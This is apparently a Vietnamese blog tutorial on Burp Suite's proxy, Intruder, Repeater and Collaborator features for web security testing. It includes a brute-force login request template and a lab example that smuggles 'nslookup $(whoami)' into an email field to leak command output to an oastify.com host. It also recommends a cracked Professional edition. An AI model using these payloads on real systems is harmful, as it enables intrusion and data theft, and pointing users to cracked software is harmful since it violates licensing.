---
title: "Burp Suite Exploit"
description: Introduction to using Burp Suite to analyze and exploit web vulnerabilities.
date: 2025-05-06 23:01:00 +0700
categories: [Cybersecurity, Tools]
tags: [introduction, tool, web, portswigger]
pin: false
comments: true
image:
    path: /assets/img/posts/2025-05-06-burpsuite-exploit/burpsuite.png
    alt: Burp Suite
---

## Introduction
---
**Burp Suite** là một công cụ mạnh mẽ và phổ biến được sử dụng trong lĩnh vực kiểm thử bảo mật ứng dụng web (web application security testing). Được phát triển bởi **PortSwigger**, **Burp Suite** cung cấp một bộ công cụ tích hợp giúp các chuyên gia bảo mật có thể phân tích, kiểm soát và khai thác các lỗ hổng trong ứng dụng web một cách hiệu quả.

**Burp Suite** hoạt động như một proxy trung gian giữa trình duyệt của bạn và máy chủ web mà bạn đang truy cập. Khi bạn cấu hình trình duyệt sử dụng Burp làm proxy (thường là 127.0.0.1:8080), tất cả lưu lượng **HTTP/HTTPS** sẽ đi qua Burp trước khi đến server và ngược lại.

Với khả năng chặn và chỉnh sửa lưu lượng **HTTP/HTTPS** giữa trình duyệt và máy chủ web, **Burp Suite** cho phép bạn quan sát chi tiết cách một ứng dụng hoạt động, từ đó phát hiện các điểm yếu tiềm ẩn của ứng dụng web.

**Burp Suite** có 2 phiên bản là **Community Edition** và **Professional**, nó có sự khác biệt rõ ràng về tính năng, tốc độ, sức mạnh, đúng với câu `"Tiền nào của đấy"`.

## Installation
---
Bạn có thể thử cả 2 phiên bản để thấy được sự khác biệt của chúng.
- **Burp Suite Community Edition**: [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
- **Burp Suite Professional**: [https://portswigger.net/burp/pro](https://portswigger.net/burp/pro)
- **Burp Suite Professional (Crack)**: [https://github.com/xiv3r/Burpsuite-Professional](https://github.com/xiv3r/Burpsuite-Professional)

> Nếu không có điều kiện để sử dụng bản **Professional**, bạn có thể sử dụng bản **Crack** (trên máy ảo)
{: .prompt-info }

## Usage
---
### Proxy
Phần **Proxy** là nơi Burp Suite hoạt động như một cổng trung gian (intercepting proxy) giữa trình duyệt và máy chủ web. Khi bạn bật tính năng chặn (`Intercept is on`), mọi request từ trình duyệt sẽ bị giữ lại để bạn xem xét hoặc chỉnh sửa trước khi gửi đi.

- Dùng để xem chi tiết request (headers, body, cookies...).
- Cho phép thay đổi nội dung request để kiểm tra các phản hồi khác nhau từ server.
- Giúp bạn kiểm tra cách ứng dụng xử lý dữ liệu đầu vào.
- Có thể drop request 

**Proxy** đã được thêm vào browser mặc định của **Burp Suite (chromium)**, nếu muốn linh hoạt hơn, có thể chỉnh **Proxy** trên **Burp Suite** hoặc thêm nó vào trình duyệt của bạn.
- Để tùy chỉnh **Proxy**: Settings -> Proxy -> Proxy listeners
- Thêm vào trình duyệt: sử dụng **[Foxy Proxy](https://getfoxyproxy.org/downloads/) (recommended)** hoặc **Proxy Setting** của từng trình duyệt khác nhau.

### Intercept
**Intercept** cho phép tạm dừng (giữ lại) các request và response. Click **Intercept off** để bật tính năng này.

- Khi bật Intercept, Burp sẽ giữ lại mỗi request để bạn kiểm duyệt hoặc chỉnh sửa.
- Sau khi sửa, bạn có thể chọn **Forward** để gửi đi hoặc **Drop** để chặn hẳn.

### Repeater
**Repeater** cho phép bạn *gửi lại một request nhiều lần* với các chỉnh sửa khác nhau để phân tích phản hồi từ server.

- Bạn có thể gửi request thủ công và sửa mọi thứ từ URL, headers đến body.
- Repeater hiển thị rõ ràng response của server cho từng lần gửi.
- Dùng để test logic ứng dụng, kiểm tra injection, hoặc xác định điểm bất thường trong phản hồi.

### Intruder

**Intruder** là công cụ trong Burp Suite giúp tự động gửi nhiều HTTP request với các dữ liệu khác nhau, rất hữu ích để kiểm thử lỗ hổng như brute force, fuzz tham số, hoặc thử các payload khai thác.
- **Burp Suite Community Edition**: Bị giới hạn **Resource pool (Concurrency request)**, mỗi lần chỉ thực hiện được 1 request
- **Burp Suite Professional**: Không bị giới hạn, có khả năng custom **Resource pool**.

---

#### Step Using Intruder:

1. **Gửi request đến Intruder:**
   - Từ tab Proxy hoặc Repeater, chuột phải vào một request → chọn **"Send to Intruder"**.

2. **Chọn vị trí cần tấn công:**
   - Tab **"Positions"**: Burp sẽ tự động đánh dấu các chỗ `$...$` là payload positions.
   - Bạn có thể dùng nút **"Clear"** để xóa hết, rồi **"Add"** lại những vị trí bạn muốn tùy chỉnh.

3. **Chọn kiểu tấn công (Attack Type):**
   - `Sniper`: Thay đổi từng vị trí một.
   - `Battering ram`: Một payload cho tất cả.
   - `Pitchfork`: Dùng danh sách khác nhau theo thứ tự.
   - `Cluster bomb`: Kết hợp tất cả giá trị payloads.

4. **Cấu hình dữ liệu tấn công (Payloads):**
   - Tab **"Payloads"**:
     - Chọn danh sách payloads (ví dụ: `admin`, `test`, `guest`, ...)
     - Có thể import từ file hoặc thêm thủ công.

5. **Chạy tấn công:**
   - Nhấn **"Start attack"** (hoặc Ctrl+Enter).
   - Xem kết quả trả về trong bảng để tìm response khác biệt (status code, length, content,...).


#### Example: Brute Force Login

- Endpoint: `POST /login HTTP/1.1`
- Payload position: Thay đổi giá trị username và password

```http
POST /login HTTP/1.1
Host: target.site
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=§admin§&password=§123§
```

### Burp Collaborator
**Burp Collaborator** là một dịch vụ đặc biệt được tích hợp trong Burp Suite dùng để phát hiện các lỗ hổng **out-of-band** – tức là các lỗi không trả kết quả trực tiếp trong response mà thực thi ở hệ thống backend.

---

#### How It Works
1. Burp sinh ra một **Collaborator payload** dạng domain đặc biệt (ví dụ: `abc123.burpcollaborator.net`).
2. Payload này được chèn vào các vị trí nghi ngờ trong request (header, parameter, cookie, v.v.).
3. Nếu hệ thống mục tiêu có lỗ hổng (ví dụ: SSRF), nó sẽ thực hiện truy cập đến domain của Burp.
4. Burp sẽ ghi lại kết nối đến domain đó (DNS, HTTP, SMTP...) và báo về cho bạn.

#### Types of Interactions Detected
- **DNS lookup**: Cho thấy hệ thống backend thực hiện truy vấn DNS (rất hữu ích cho SSRF).
- **HTTP request**: Backend gửi request HTTP đến payload (dùng trong Blind XSS, RFI...).
- **SMTP**: Burp Collaborator có thể phát hiện nếu hệ thống mục tiêu cố gắng gửi email đến một địa chỉ chứa payload đặc biệt. Điều này thường xảy ra khi ứng dụng có chức năng gửi email (ví dụ: xác nhận đăng ký, khôi phục mật khẩu) và địa chỉ email bị kiểm soát bởi attacker.

#### How To Use
1. Vào tab **Collaborator**.
2. Bấm **"Copy to clipboard"** để lấy payload domain.
3. Chèn domain này vào request gửi đến ứng dụng mục tiêu (thường là trong URL, header, hoặc data).
4. Nhấn **"Poll now"** để kiểm tra tương tác được gửi về Collaborator.

#### Example
```http
POST /feedback/submit HTTP/2
Host: 0ae200ac03a70a2a806f942c006e00dd.web-security-academy.net
Cookie: session=ycHcI7hP8dwQ1RNIsDxeXeFn7cXyDALS
Content-Length: 130
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ae200ac03a70a2a806f942c006e00dd.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ae200ac03a70a2a806f942c006e00dd.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=dM6HXGuUvEqcYILleMSfFxFDZpqeeMlH&name=a&email=a||nslookup+$(whoami).z668wg7s5b9az0so7ldabr1ynptgh95y.oastify.com||&subject=a&message=a
```

Ở tab **Collaborator** ta nhận được: The Collaborator server received a DNS lookup of type A for the domain name peter.z668wg7s5b9az0so7ldabr1ynptgh95y.oastify.com.

---
Goodluck! 🍀🍀🍀